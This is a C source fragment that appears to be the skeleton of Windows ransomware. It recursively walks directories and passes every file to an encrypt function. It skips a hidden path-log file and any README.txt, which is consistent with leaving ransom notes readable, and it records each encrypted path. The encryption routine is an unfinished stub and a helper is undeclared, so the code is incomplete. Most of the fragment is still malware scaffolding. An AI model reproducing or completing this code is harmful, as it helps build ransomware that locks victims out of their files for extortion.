#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef _WIN32
#include <windows.h>
#endif


void enumerate(const char *path, const char *key) {
#ifdef _WIN32
    WIN32_FIND_DATA findFileData;
    HANDLE hFind = INVALID_HANDLE_VALUE;
    char dirSpec[MAX_PATH];
    snprintf(dirSpec, MAX_PATH, "%s\\*", path);
    hFind = FindFirstFile(dirSpec, &findFileData);

    if (hFind == INVALID_HANDLE_VALUE) {
        printf("FindFirstFile failed (%d)\n", GetLastError());
        return;
    }

    do {
        if (strcmp(findFileData.cFileName, ".") != 0 && strcmp(findFileData.cFileName, "..") != 0) {
            char fullPath[MAX_PATH];
            snprintf(fullPath, MAX_PATH, "%s\\%s", path, findFileData.cFileName);
            if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                enumerate(fullPath, key);
            } else {
                if (strcmp(fullPath, "C:\\Users\\Public\\Documents\\.paths.txt") != 0 && strstr(fullPath, "README.txt") == NULL) {
                    if (encrypt(fullPath, key) == 1) {
                        append_to_paths(fullPath);
                    }
                }
            }
        }
    } while (FindNextFile(hFind, &findFileData) != 0);

    FindClose(hFind);
#endif
}

int encrypt(const char *filepath, const char *key) {
    // TODO
    return 0;
}